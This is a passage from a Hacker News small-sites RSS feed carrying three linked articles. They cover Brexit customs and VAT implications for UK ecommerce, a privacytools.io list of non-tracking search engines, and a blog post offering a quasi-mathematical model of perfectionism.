ecommerce" width="1122" height="740" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg 1122w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-980x646.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-480x317.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1122px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg 1122w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-980x646.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-480x317.jpeg 480w"></p><h3>Implications for UK businesses:</h3><p>If the UK leaves the EU without a deal we will become a third country, with no preferential deal for customs purposes or for VAT. Duties and taxes will be payable on all goods and shipping times may vary depending on customs clearance.</p><p>Licenses and approvals issued by the UK will no longer be recognised by the EU.</p><p>Companies based in the UK&nbsp;can no longer operate in the EU as a member state and need to establish a representative in an EU country.</p><p>The UK stops being part of EU systems. Access to these systems would need to be renegotiated as a third country.</p><p>Printed matter including catalogues and direct mail may be impacted. If airports and ports are open there should be no change to how this mail is distributed, via post, to the EU. However, if goods traffic is held at ports, tunnels and airports, then mail could also be held up with it.</p><p>UK companies will have to change the way they manage data transfers, such as consumer data for shipping-labels if the data originates from businesses within the EU. Further information can be found on the <a href="https://ico.org.uk/for-organisations/data-protection-and-brexit/" target="_blank" rel="noopener noreferrer">ICO website</a>.</p><h2>What customs arrangements do we currently get as part of the EU?</h2><p>The current customs arrangements allow businesses to move goods freely between EU member states. For customs, this means that businesses trading with the rest of the EU do not have to make any customs import or export declarations. Trade with the EU is not subject to import duty.</p><p>Certain goods are subject to excise duty. These goods are currently free to move between the UK and the rest of the EU with excise duty suspended. The three categories of excise goods that can be held in an excise warehouse in duty-suspension are:</p><ol><li>Alcohol products&nbsp;including&nbsp;beers,&nbsp;wines&nbsp;and spirits.</li><li>Tobacco products&nbsp;including&nbsp;cigarettes, cigars and loose&nbsp;tobacco.</li><li>Energy products&nbsp;including&nbsp;hydrocarbon oils&nbsp;and biofuels for use as&nbsp;motor or&nbsp;heating fuel.</li></ol><p>The government has negotiated to remain in the Common Transit Convention after Brexit to facilitate cross-border movements of goods between contracting parties to the Convention. This will reduce admin activity required by traders. For example, any payment charges due on goods will only be required in their destination country. This should partially mitigate some consequences for the travel of non-EU goods within the EU in the event of a no-deal Brexit.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121,h_738/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121,h_738/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg" alt="Brexit Implications for ecommerce" width="1121" height="738" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg 1121w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-480x316.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1121px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg 1121w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-480x316.jpeg 480w"></p><h2>What are the current VAT and duties arrangements for goods travelling to the EU?</h2><p>VAT is payable by businesses when they bring goods into the UK. There are different rules depending on whether the goods come from an EU or non-EU country.</p><p>Goods that are exported by UK businesses to non-EU countries and EU businesses are zero-rated, meaning that UK VAT is not charged at the point of sale.</p><p>Goods that are exported by UK businesses to EU consumers have either the UK or EU VAT charged, subject to distance selling thresholds.</p><p>For services, the ‘place of supply’ rules determines the country in which you need to charge and account for VAT.</p><h2>What will a no-deal scenario mean for customs arrangements of goods?</h2><h3>Trade with friction</h3><p>The same customs and excise rules for goods moving between the UK and the non-EU countries will apply to goods moving between the UK and EU. Import and export declarations will also be required.</p><h3>Carrier declarations</h3><p>Carrier declarations will be required for the safety and security of goods.</p><h3>Excise goods</h3><p>The Excise Movement Control System (EMCS) would no longer be used to control suspended movements between the EU and the UK, so the aforementioned excise goods would no longer enjoy duty-suspended movement.</p><h3>Importation for EU</h3><p>Goods entering the UK from the EU will require import declarations. Customs checks may be carried out and any customs duties must be paid.</p><p>Companies must register for a UK Economic Operator Registration and Identification (EORI) number to be used on customs declarations by freight forwarders and couriers and accurate classification on imported material will be needed.</p><p>Arrangements will need to be made with Brokerage and Freight Forwarding companies to get goods to the point of final distribution.</p><h3>Exporting from the UK</h3><p>Businesses must register for a UK EORI number to export, and contracts and International Terms and Conditions of Service (<a href="https://www.gov.uk/guidance/international-trade-paperwork-the-basics" target="_blank" rel="noopener noreferrer">INCOTERMS</a>) must be amended to reflect that your business is now an exporter.</p><p>Export declarations and safety and security declarations will be required.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119,h_736/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119,h_736/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg" alt="Brexit Implications for ecommerce" width="1119" height="736" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg 1119w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-480x316.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1119px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg 1119w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-480x316.jpeg 480w"></p><h2>What will a no-deal scenario mean for VAT and duties arrangements for goods?</h2><h3>VAT imports</h3><p>Postponed accounting will need to be introduced for import VAT on goods brought into the UK. UK VAT registered businesses importing goods to the UK will be able to account for import VAT on their VAT return, rather than paying import VAT on, or soon after, the time that the goods arrive at the UK border.</p><h3>VAT on goods entering the UK as parcels</h3><p>If the UK leaves the EU without an agreement, then&nbsp;Low-Value Consignment Relief (LVCR)&nbsp;will no longer apply to any parcels arriving in the UK. This aligns the UK with the global direction of travel on&nbsp;LVCR. This means that all goods entering the UK, as parcels sent by overseas businesses, will be liable for VAT.</p><p>Overseas businesses will charge VAT at the point of purchase and will be expected to register with an HM Revenue &amp; Customs (HMRC) digital service and account for the VAT due.</p><h3>VAT on exported goods</h3><p>If the UK leaves the EU without an agreement, VAT registered UK businesses will continue to be able to zero-rate sales of goods to EU businesses but will not be required to complete EU sales lists.</p><p>Current EU rules would mean that EU member states will treat goods entering the EU from the UK in the same way as goods entering from other non-EU countries. Associated import VAT and customs duties would be due when the goods arrive in the EU.</p><h2>What are the implications of the EU accepting a government deal?</h2><p>If a deal, similar to that already constructed by the UK Government, were to be accepted by both Parliament and the EU, there would be a few different implications to consider.</p><p>As of the 30th March 2019, the UK no longer participates in EU decision-making, EU institutions, and governance of EU bodies and agencies.</p><p>The role of EU institutions in the supervision and enforcement of EU law in the UK would continue throughout the transition period.</p><p>The EU would need to negotiate with the UK an agreement on their future relationship, which should ideally be in place (agreed, signed and ratified) at the end of the transition period and apply as from 1st January 2021.</p><p>UK businesses would have some planning time as there would be no immediate impact on customs procedures and the ability to import and export within the EU. There would also be no changes to customs declarations.</p><p>Alternate recommended articles:</p><p>:<a href="https://www.swifterm.com/the-2nd-tier-of-email-marketing/"><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_298,h_198/https://www.swifterm.com/wp-content/uploads/2020/09/2nd-tier-email-solution-1.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_298,h_198/https://www.swifterm.com/wp-content/uploads/2020/09/2nd-tier-email-solution-1.jpeg" alt="2nd-tier-email-solution" width="298" height="198"></a></p></div></div>]]>
            </description>
            <link>https://www.swifterm.com/brexit-and-the-implications-for-ecommerce/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088638</guid>
            <pubDate>Fri, 13 Nov 2020 23:06:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What private search engine do you use? Why?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25088594">thread link</a>) | @karinakarina
<br/>
November 13, 2020 | https://www.privacytools.io/providers/search-engines/ | <a href="https://web.archive.org/web/*/https://www.privacytools.io/providers/search-engines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <main>
  <nav id="breadcrumb" aria-label="breadcrumb">
  
  <ol itemscope="" itemtype="https://schema.org/BreadcrumbList">
    <li>
      <a href="https://www.privacytools.io/"> <span>Home</span></a>
    </li>
    
    
    <li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
      <a href="https://www.privacytools.io/providers/" itemprop="item"><span itemprop="name">Providers</span></a>
      <meta itemprop="position" content="1">
    </li>
    
    
    
    <li aria-current="page" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
      
      <span itemprop="name">Search Engines 
      </span>
      <meta itemprop="position" content="2">
    </li>
    
    
  </ol>
</nav>


<div>
  
  <p>Find a search engine that doesn't track your queries or build an advertising profile based on your searches.</p>
</div>



<p><strong>If you are currently using search engines like Google, Bing, or Yahoo, you should pick an alternative here.</strong>
</p>


<br>


<div>
  
  <div>
    <p>
      <img src="https://www.privacytools.io/assets/img/svg/3rd-party/duckduckgo.svg" height="120" width="120" alt="DuckDuckGo logo">
      DuckDuckGo is a "search engine that doesn't track you." Some of DuckDuckGo's code is free software hosted at GitHub, but the core is proprietary. <span></span> <a href="https://www.privacytools.io/providers/#ukusa">The company is based in the USA.</a>
      
    </p>
    
  </div>
</div>
<br>



<br>


<div>
  
  <div>
    <p>
      <img src="https://www.privacytools.io/assets/img/svg/3rd-party/startpage.svg" height="120" width="120" alt="Startpage.com logo">
      Startpage.com is a search engine that provides Google search results with complete privacy protection. <span></span> Startpage BV is a Netherlands-based company that has been dedicated to privacy-respecting search since 2006.
      
      
      
        
          
        
<a href="https://support.startpage.com/index.php?/Knowledgebase/Article/View/1277/0/startpage-ceo-robert-beens-discusses-the-investment-from-privacy-one--system1" data-toggle="tooltip" title="Startpage.com was recently acquired by United States-based System1."><i></i> Warning

</a>


        
        
        
        
        
      
      
    </p>
    
  </div>
</div>
<br>


<h3>Worth Mentioning</h3>

<ul>
  <li><a href="https://metager.org/">MetaGer</a> - An <a href="https://gitlab.metager.de/open-source/MetaGer">open-source</a>, metasearch engine run as a non-profit based in Germany. (<a href="https://metager.org/datenschutz">Privacy Policy</a>)</li>
  <li><a href="https://www.mojeek.com/">Mojeek</a> - An independent search engine based in the UK, and the <a href="https://blog.mojeek.com/2018/10/search-that-does-not-follow-you-around.html">first search engine to have a policy of not tracking its users.</a> (<a href="https://www.mojeek.com/about/privacy/">Privacy Policy</a>)</li>
  <li><a href="https://yacy.net/">YaCy</a> - An <a href="https://github.com/yacy/yacy_search_server">open-source</a>, peer-to-peer search engine powered by its users.</li>
</ul>



  </main>
  
</div></div>]]>
            </description>
            <link>https://www.privacytools.io/providers/search-engines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088594</guid>
            <pubDate>Fri, 13 Nov 2020 23:01:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Pretty Good Mathematical Model of Perfectionism]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25088396">thread link</a>) | @freefrancisco
<br/>
November 13, 2020 | https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/ | <a href="https://web.archive.org/web/*/https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

					

					

					<p>I struggle with perfectionism. Well, not so much “struggle with” — I’m f*cking great at it. It comes naturally.</p>
<p>There are some upsides, but perfectionism is also associated with anxiety, depression, procrastination, and damaged relationships. Perhaps you, like I, have spent far too much time and emotional energy making sure that an email had the right word choice, had no typos, didn’t reuse a phrase in successive sentences/paragraphs, and closed with the ‘correct’ sign-off. (‘Best,’ is almost always optimal, by the way).</p>
<blockquote><p>“If I couldn’t do something that rated 10 out of 10 — or at least close to that — I didn’t want to do it at all. Being a perfectionist was an ongoing source of suffering and unhappiness for me … Unfortunately, many of us have been conditioned to hold ourselves to impossible standards. This is a stressful mind state to live in, that’s for sure.” ~ <a href="https://www.psychologytoday.com/us/blog/turning-straw-gold/201806/how-overcome-your-perfectionist-tendencies" target="_blank" rel="noopener">Tony Bernard J.D.</a></p></blockquote>
<p>The topic of perfectionism confused me for years. Of course you want things to be perfect; why would you ever actively want something to be worse? However, there’s way more to it than that: It’s a complex interplay between effort, time, motivation, and expectations.</p>
<p>Far too many self-help recommendations essentially said “Be ok with mediocrity!” which… did not speak to me, to say the least.</p>
<p>To better understand the concept, I went through a number of books and papers before building a quasi-mathematical model. You know, like ya’do.</p>
<p>I’ve come to see perfectionism as a mindset with a particular calibration between the quality of your work and your emotional reaction — with decreased sensitivity to marginal differences in lower-quality work and increasing sensitivity as the quality goes up.</p>
<p><img data-attachment-id="2370" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/graphs/" data-orig-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=1080%2C560&amp;ssl=1" data-orig-size="1080,560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="graphs" data-image-description="" data-medium-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=300%2C156&amp;ssl=1" data-large-file="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?fit=630%2C327&amp;ssl=1" loading="lazy" src="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?resize=630%2C327&amp;ssl=1" alt="graphs" width="630" height="327" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/jessegalef.com/wp-content/uploads/2020/08/graphs.png?resize=630%2C327&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<ul>
<li><span><strong>In a “Balanced” mindset,</strong> </span>you become happier in linear proportion to how much better your work is going. (y = x)</li>
<li><span><strong>In a “Satisficing” mindset</strong></span> — taking a pass/fail test, for example — you care about whether something is “good enough”. Most of your emotional variance comes as you approach and meet that threshold.&nbsp; ( e^x / (1+e^x) )</li>
<li><span><strong>In a Perfectionist mindset,</strong></span> the relationship between quality and emotion is polynomial. You feel almost equally bad about scoring a 40% on a test vs. a 65%, but the difference between a 90% and 93% looms large. (y = x^7)</li>
</ul>
<p>Looking at the model, I realized it could explain a number of experiences I’d had.</p>
<hr>
<h3>Why even small tasks seem daunting to a perfectionist</h3>
<p>A common experience with a perfectionist mindset is having trouble ‘letting go’ of a project — we want to keep tinkering with it, improving it, and never feel quite comfortable moving on. &nbsp;(I don’t want to say how long this draft sat around.)</p>
<p>This make sense given the model:</p>
<p><img data-attachment-id="2369" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/happyenough/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=1200%2C702&amp;ssl=1" data-orig-size="1200,702" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="HappyEnough" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=630%2C369&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;ssl=1" alt="HappyEnough" width="630" height="369" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>When I think about clicking ‘send’ or ‘post’ before I’ve checked for typos, before I’ve reread everything, before considering where it might be wrong or unclear… it just feels, well, WRONG. I’m not yet happy with it and have trouble declaring it done.</p>
<p>Apart from requiring more time and effort, this can make even seemingly trivial tasks feel daunting. Internally, if you know that a short email will take an hour and a half it’s going to loom large even if you have trouble explaining quite why such a small thing is making you feel overwhelmed.</p>
<hr>
<p><strong>What’s helped me:</strong> A likely culprit is overestimating the consequences of mistakes. One solution is to be concrete and write down what you expect to happen if it turns out you have a typo, miss a shot, or bomb a test. Sometimes all it takes to readjust is examining those expectations consciously. Other times you’ll need to experience the ‘failure’, at which point you can compare it to your stated expectations.</p>
<hr>
<h3>Why perfectionists give up on hobbies and tasks easily</h3>
<p>Another way to look at this is: if you don’t expect to reach high standards, a project just doesn’t seem worth doing.</p>
<p><img data-attachment-id="2368" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/adequateresults/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=1266%2C744&amp;ssl=1" data-orig-size="1266,744" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="AdequateResults" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=630%2C370&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;ssl=1" alt="AdequateResults" width="630" height="370" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>The result is a kind of min-max of approach to life: If you can’t excel, don’t bother spending time on it.</p>
<p>That’s not necessarily a bad thing!</p>
<p>However, we don’t always have control. In my nonprofit communications career, I sometimes got assigned to write press releases on topics that *might* get attention, but which seemed not newsworthy to me. It may have still been worth the few hours of my time in case it grabbed a reporter’s eye. It was important to keep my job. But I had so. much. trouble. getting myself to do the work.</p>
<p>Even in the personal realm, picking up a new hobby is made difficult. If it doesn’t seem like you’re going to be amazing at it, the hobby as a whole loses its luster.</p>
<hr>
<p><strong>What’s helped me: </strong>A big problem for me has been overlooking the benefits gained from so-called “failure”. Once I start to factor in e.g. how much I expect to learn (so that I can do better in the future) I end up feeling much better about giving things a shot.</p>
<hr>
<h3>Why procrastination (and anxiety) are common</h3>
<p>At a granular scale, the problem becomes worse. Rather than “How good do I expect to feel at the end of this?” our emotional reaction is probably trained by the in-the-moment “How much happier do I expect to feel as a result of one more bit of work?”</p>
<p>In other words, we can view the derivative/slope of these graphs as motivation:</p>
<p><img data-attachment-id="2367" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/motivationcurves/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=1198%2C608&amp;ssl=1" data-orig-size="1198,608" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="MotivationCurves" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=300%2C152&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=630%2C320&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;ssl=1" alt="MotivationCurves" width="630" height="320" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>With a perfectionist mindset, the bigger and further away a goal is, the more difficult it will be to feel motivated in the moment.&nbsp; For much of the time, we’re trying to push ourselves to work without getting any internal positive reinforcement.</p>
<p>This is a particular issue in the Effective Altruism movement where the goal is to *checks notes* Save the World. Also, to (“Figure out how to do the most good, and then do it.”)</p>
<p>It’s true that as a perfectionist nears their goal, they’re extremely motivated! But that also means that the stakes are very high for every decision and every action.&nbsp; …Which is a recipe for anxiety. Terrific.</p>
<hr>
<p><strong>What’s helped me: </strong>To the extent that I can, I find that breaking tasks into pieces helps. If I think of my goal as “Save the World”, another day of work won’t feel very important. But a goal of “Finish reading another research paper” is something I can make real progress on in a day!</p>
<hr>
<h2>All models are wrong, but some are useful</h2>
<p>This framework isn’t perfect. Neither is this writeup. (I’m hyper-aware.) But this idea has been in my head, in my drafts folder, and unfinished for months. Rather than give in to the sense that I “should” keep working on it, I’m going to try following my own advice. I’m remembering that:</p>
<ul>
<li>I’ve clarified my thinking a ton by writing everything down.</li>
<li>The consequences of a sloppy post in are minimal in the big scheme of things.</li>
<li>This isn’t supposed to be my final conclusion – it’s one step on the path</li>
</ul>
<p>Even if it’s not perfect, perhaps the current iteration of this framework can help you understand me, yourself, or perfectionists in your life.</p>
<p>I used to have this “DONE IS BETTER THAN PERFECT” poster draped over a chair in my office. I never got around to hanging it up, but honestly? It seems better that way.</p>
<p><img data-attachment-id="2366" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/poster/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=720%2C1276&amp;ssl=1" data-orig-size="720,1276" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Poster" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=169%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?fit=578%2C1024&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?resize=250%2C443&amp;ssl=1" alt="Poster" width="250" height="443" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/poster.png?resize=250%2C443&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<h2>Articles/books I found helpful:</h2>
<p><a title="The-Perfectionist-Script-for-self-defeat" href="https://jessegalef.com/wp-content/uploads/2020/08/the-perfectionist-script-for-self-defeat.pdf">The-Perfectionist-Script-for-self-defeat</a> by David Burns (pdf)</p>
<p><a href="https://www.amazon.com/dp/B005ZE5AT2/" target="_blank" rel="noopener">When Perfect Isn’t Good Enough</a> by&nbsp;<span><span>Martin M. Antony&nbsp;&amp;</span><span><span>&nbsp;</span></span></span><span>Richard P. Swinson</span></p>
<p><a href="https://www.amazon.com/dp/B06XCY97JT/" target="_blank" rel="noopener">Mastering the Art of Quitting</a> by Peg Streep &amp; Alan Bernstein</p>
<p><a href="https://www.amazon.com/dp/B00475ARKC/" target="_blank" rel="noopener">Better By Mistake</a> by Alina Tugend</p>
<p><a href="https://www.amazon.com/dp/B003ZSHUP2/" target="_blank" rel="noopener">The Procrastination Equation</a> by Piers Steel</p>

					
					<!--
					<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/"
    dc:identifier="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/"
    dc:title="A Pretty-Good Mathematical Model of Perfectionism"
    trackback:ping="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/trackback/" />
</rdf:RDF>					-->

				</div></div>]]>
            </description>
            <link>https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088396</guid>
            <pubDate>Fri, 13 Nov 2020 22:37:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Release of Ruby 3 Will Be Monumental]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25088015">thread link</a>) | @tomashertus
<br/>
